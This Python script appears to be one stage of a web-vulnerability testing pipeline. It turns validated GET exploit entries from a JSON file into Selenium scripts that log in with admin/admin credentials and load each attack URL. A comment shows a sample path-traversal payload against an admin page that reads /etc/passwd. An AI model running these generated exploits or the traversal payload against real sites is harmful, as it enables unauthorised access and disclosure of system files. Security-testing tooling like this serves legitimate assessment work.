from selenium import webdriver
import time
import selenium
import json

def MakeFile(baseurl1,userid,passwordid,atkUrl, loginflag):
	baseurl = baseurl1 #"https://app7.com/oc-admin/index.php?page=login"
	exploiturl = atkUrl #"https://app7.com/oc-admin/index.php?page=appearance&action=render&file=../../../../../../../../../../etc/passwd"
	usernameparam = userid #"user"
	passwordparam = passwordid #"password"
	username = "admin"
	password = "admin"
	submitparam = "//input[@name='submit']"
#	driver = webdriver.Firefox()
#	driver.get(baseurl)
	'''
	inp_elems = driver.find_elements_by_tag_name('input')
	print "Eter"
	for i in inp_elems:
			if (((i.get_attribute('type') == 'button') or (i.get_attribute('type') == 'submit')) & 
				((i.get_attribute('value') == 'Login') or (i.get_attribute('value') == 'login'))):
			#	i.click()
			#	url2= driver.current_url
				submitparam = i.get_attribute('type')
				break
				#to verify is login is successful or not,
				#we wil verify if the username is available somewhere on the webpage
		#		if(url2 == loginURL):
		#			print "login attempt failed"
		#		else:
		#			driver.get(url2)
		#			print "login successful"
		#			return "true"
	driver.quit()  
	'''	
	imports = [
		"from selenium.webdriver.common.by import By",
		"from selenium.webdriver.support.ui import Select",
		"from selenium import webdriver",
		"from selenium.common.exceptions import NoSuchElementException",
		"from selenium.webdriver.common.keys import Keys",
		"import time"
	]

	exploitcontent = [
		'',
		'baseurl = "%s"' % baseurl,
		'exploiturl = "%s"' % exploiturl,
	]

	if (loginflag):
		loginspecific = [
			'%s = "%s"' % (usernameparam, username),
			'%s = "%s"' % (passwordparam, password)
		]
		exploitcontent.extend(loginspecific)

	exploitcode = [
		'',
		'mydriver = webdriver.Firefox()',
		'mydriver.get(baseurl)',
		'mydriver.maximize_window()'
	]

	if (loginflag):
		loginspecific = [
			'',
			"mydriver.find_element_by_name('%s').clear()" % usernameparam,
			"mydriver.find_element_by_name('%s').send_keys('%s')" % (usernameparam, username),
			"mydriver.find_element_by_name('%s').clear()" % passwordparam,
			"mydriver.find_element_by_name('%s').send_keys('%s')" % (passwordparam, password),
			'mydriver.find_element_by_xpath("%s").click()' % submitparam
		]
		exploitcode.extend(loginspecific)

	closesession = [
		'',
		'mydriver.get("%s")' % exploiturl,
		'time.sleep(5)',
		'mydriver.quit()'
	]

	code = "\n".join(imports) + "\n".join(exploitcontent) + "\n".join(exploitcode) + "\n".join(closesession)

	return code

#ret = MakeFile()
f = open("json/credentials.json", 'r').read();
credential = json.loads(f)
baseurl = ""
userid = ""
passwordid = ""
loginflag = ""

for a in credential:
	baseurl = a["url"]
	userid = a["userid"]
	passwordid = a["passwordid"]
	if a["login"] != "": 
		loginflag =  False

f = open("json/Stage3_valid_exploits.json", 'r').read();	
payload_data = json.loads(f)
payloads = payload_data["exploits"]

i = 0
for exp in payloads:
	if exp["method"] == "GET":

	  atkUrl = str(exp["url"]).strip();
	  params = exp["params"]
	  paramCount = len(params)
	  if (paramCount>0):
	    atkUrl = atkUrl + "?"
	  for param in params:
	    paramCount = paramCount - 1
	    atkUrl = atkUrl + str(param["key"]) + '=' + str(param["value"])
	    if(paramCount > 0):
	      atkUrl = atkUrl + "&"
	  atkUrl = atkUrl.strip()
	 # loginflag = False
	  ret = MakeFile(baseurl,userid,passwordid,atkUrl,loginflag)
	  #print (ret)
	  f = open("pycode/pycode" + str(i) + ".py", 'w')
	  f.write(ret)
	  i = i+1

print 'Execution completed. Stage4-Selenium Scripts generated.'